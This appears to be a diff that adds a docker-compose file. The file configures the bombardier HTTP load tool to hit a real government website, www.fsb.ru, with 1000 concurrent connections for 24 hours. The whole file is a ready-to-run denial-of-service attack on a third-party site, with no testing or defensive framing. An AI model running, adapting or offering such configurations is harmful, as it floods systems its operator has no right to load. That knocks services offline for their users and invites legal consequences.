@@ -1,0 +1,5 @@
+version: "3.9"
+services:
+        gov_1:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://www.fsb.ru"
